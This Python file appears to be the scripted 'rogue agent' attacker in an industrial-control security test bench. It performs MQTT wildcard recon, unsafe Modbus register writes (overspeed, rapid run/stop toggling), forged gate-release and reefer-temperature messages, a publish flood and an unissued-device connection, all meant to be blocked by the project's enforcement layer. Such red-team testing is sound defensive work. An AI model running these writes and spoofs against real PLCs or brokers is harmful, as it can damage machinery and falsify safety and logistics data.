"""Rogue agent (compromised). Separate process, OFF by default.

Running this file starts the scripted attack sequence:
    0. wildcard recon: subscribe to # and capture a traffic sample
    1. set speed setpoint to 3000 RPM (above policy ceiling)
    2. toggle RUN/STOP 5 times fast
    3. publish an unauthorized gate release for a container that never arrived
    4. publish a spoofed reefer temperature (implausible jump off setpoint)
    5. publish flood: burst of rapid publishes to trigger the rate cap
    6. unknown-device connect: unissued credential attempts a gate release

Holds its own MQTT connection (own client ID) and its own credential
issued separately via identity.py. Shares nothing with sim/agents.py:
no shared imports, state, credential objects, or sessions — the rogue
can never read or borrow the operator's credential.
"""

import argparse
import json
import sys
import time
from pathlib import Path

# Allow `python3 sim/rogue.py` script runs to import sentinel.*.
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import paho.mqtt.client as mqtt
from pymodbus.client import ModbusTcpClient

from sentinel import identity

HR_RUN_STOP = 0
HR_SPEED_SETPOINT = 1

TOPIC_TEMPERATURE = "site/line1/sensors/temperature"
TOPIC_GATE_RELEASE = "site/yard/gate/release"
TOPIC_REEFER_TEMPERATURE = "site/yard/reefer/{reefer_id}/temperature"

MQTT_CLIENT_ID = "sentinel-rogue"
CREDENTIAL_ROLE = "rogue-agent"
# Deliberately narrow: every attack below exceeds this scope, which is
# what Layer 4 enforcement will deny.
CREDENTIAL_SCOPE = ["telemetry.read"]


class RogueAgent:
    """Scripted attack sequence. Only runs when this file is executed."""

    def __init__(self, mqtt_host, mqtt_port, plc_host, plc_port):
        self.mqtt = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2,
                                client_id=MQTT_CLIENT_ID)
        self.mqtt_host, self.mqtt_port = mqtt_host, mqtt_port
        self.plc = ModbusTcpClient(plc_host, port=plc_port)
        self.credential = json.loads(identity.issue(
            CREDENTIAL_ROLE, "sentinel-ca", CREDENTIAL_SCOPE))
        self.credential_id = self.credential["id"]

    def run(self):
        print(f"ROGUE: credential id={self.credential_id} "
              f"role={CREDENTIAL_ROLE}", flush=True)
        self.plc.connect()
        self.mqtt.connect(self.mqtt_host, self.mqtt_port)
        self.mqtt.loop_start()
        print("ROGUE: starting scripted attack sequence", flush=True)
        try:
            self._recon()
            print("ROGUE[1]: overspeed -> HR1=3000", flush=True)
            self.plc.write_register(HR_SPEED_SETPOINT, 3000, device_id=1)
            time.sleep(1)
            for i in range(5):
                print(f"ROGUE[2]: run/stop toggle {i + 1}/5", flush=True)
                self.plc.write_register(HR_RUN_STOP, i % 2, device_id=1)
                time.sleep(0.5)
            print("ROGUE[3]: unauthorized gate release", flush=True)
            self.mqtt.publish(TOPIC_GATE_RELEASE, json.dumps(
                {"container": "XXXX000000", "truck": "TRK-99",
                 "booking": "BK-FAKE", "lane": "out-1",
                 "decision": "allow", "ts": time.time()}))
            time.sleep(1)
            print("ROGUE[4]: spoofed reefer temp (R-101 reports +5C, setpoint -20C)",
                  flush=True)
            self.mqtt.publish(
                TOPIC_REEFER_TEMPERATURE.format(reefer_id="R-101"), json.dumps(
                    {"value": 5.0, "unit": "C", "setpoint": -20.0,
                     "ts": time.time()}))
            time.sleep(1)
            print("ROGUE[5]: publish flood (50 rapid publishes)", flush=True)
            for i in range(50):
                self.mqtt.publish(TOPIC_TEMPERATURE, json.dumps(
                    {"value": 72.0, "unit": "C", "ts": time.time(),
                     "flood_seq": i}))
            time.sleep(1)
            self._unknown_device()
        finally:
            self.mqtt.loop_stop()
            self.mqtt.disconnect()
            self.plc.close()
        print("ROGUE: attack sequence complete", flush=True)

    def _recon(self):
        """Wildcard recon: subscribe to # and capture a traffic sample."""
        seen = []
        self.mqtt.on_message = lambda _c, _u, m: seen.append(m.topic)
        self.mqtt.subscribe("#")
        print("ROGUE[0]: wildcard recon on # ...", flush=True)
        time.sleep(3)
        self.mqtt.unsubscribe("#")
        self.mqtt.on_message = None
        print(f"ROGUE[0]: captured {len(seen)} messages via # "
              f"(e.g. {sorted(set(seen))[:5]})", flush=True)

    def _unknown_device(self):
        """Unknown-device connect: an unissued credential attempts an action."""
        ghost_id = "ghost-unknown-7"
        print(f"ROGUE[6]: unknown-device connect "
              f"(unissued credential {ghost_id}) ...", flush=True)
        ghost = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2,
                            client_id="unknown-device-7")
        ghost.connect(self.mqtt_host, self.mqtt_port)
        ghost.loop_start()
        ghost.publish(TOPIC_GATE_RELEASE, json.dumps(
            {"container": "XXXX000001", "truck": "TRK-00",
             "booking": "BK-GHOST", "lane": "out-1",
             "decision": "allow", "credential_id": ghost_id,
             "ts": time.time()}))
        time.sleep(1)
        print(f"ROGUE[6]: credential {ghost_id} was never issued -> "
              f"Layer 4 default-deny will reject", flush=True)
        ghost.loop_stop()
        ghost.disconnect()


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Rogue agent attack script (off by default).")
    parser.add_argument("--mqtt-host", default="127.0.0.1")
    parser.add_argument("--mqtt-port", type=int, default=1883)
    parser.add_argument("--plc-host", default="127.0.0.1")
    parser.add_argument("--plc-port", type=int, default=5020)
    args = parser.parse_args()

    RogueAgent(args.mqtt_host, args.mqtt_port,
               args.plc_host, args.plc_port).run()


if __name__ == "__main__":
    main()
